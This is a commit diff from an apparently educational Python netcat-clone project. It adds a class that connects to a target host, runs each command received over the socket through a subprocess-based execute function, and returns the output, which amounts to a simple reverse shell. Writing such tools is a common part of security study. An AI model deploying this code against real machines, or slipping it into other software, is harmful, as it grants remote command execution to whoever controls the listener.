574f65290855e4435b81006d1c9c3924430f9a8c
Red-stevo <stephen.muiru22@students.dkut.ac.ke>
2024-08-23 07:27:15 +0300

    Commit message >>>>> command execution working nicely <<<<<

--- NetCatTool/Netcat/__init__.py
+++ NetCatTool/Netcat/__init__.py
@@ -1,24 +1,72 @@
 import argparse as ps
 import shlex
+import socket
 import subprocess
 import textwrap as tw
 import subprocess as sp
+
+
+class Netcat:
+    def __init__(self, args, buffer=None):
+        self.args = args
+        self.buffer = buffer
+        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
+    def run(self):
+        if self.args.listen:
+            pass
+        else:
+            self.send()
+
+    def send(self):
+        self.server.connect((self.args.target, self.args.port))
+
+        if self.buffer:
+            self.server.send(self.buffer)
+
+        response = ' '
+        while response:
+            response = self.server.recv(4896)
+
+            if response:
+                try:
+                    result = execute(response.decode())
+                    self.server.send(result.encode())
+                except Exception as e:
+                    self.server.send(b'Invalid command')
+
+                self.buffer = "\n>"
+                self.server.send(self.buffer.encode())
 
 
 def main():
     parser = ps.ArgumentParser(description="Netcat tool in python",
                                formatter_class=ps.RawDescriptionHelpFormatter,
                                epilog=tw.dedent('''
-        python3 __init__.py <IP> <args>
+        __init__.py <IP> <args>
             -l  --listen 
             -u  --udp 
             -p  --port
+            -c  --command
+            -e  --execute
                                      '''))
 
-    parser.add_argument('-c', '--command', action='store_true', help='command shell')
+    parser.add_argument('-c', '--command', action='store_true', default='True', help='command shell')
     parser.add_argument('-e', '--execute', help='execute specified command')
+    parser.add_argument('-l', '--listen', action='store_true', help='listen for connection')
+    parser.add_argument('-p', '--port', type=int, default=4040, help='Port to Listen on')
+    parser.add_argument('-t', '--target', default='127.0.0.1', help='Target IP')
 
     args = parser.parse_args()
+
+    if args.listen:
+        buffer = ''
+    else:
+        buffer = "CONNECTED [ [*] ]\n >"
+
+    nc = Netcat(args, buffer.encode())
+    nc.run()
 
 
 def execute(command):
@@ -33,4 +81,3 @@ def execute(command):
 
 if __name__ == "__main__":
     main()
-
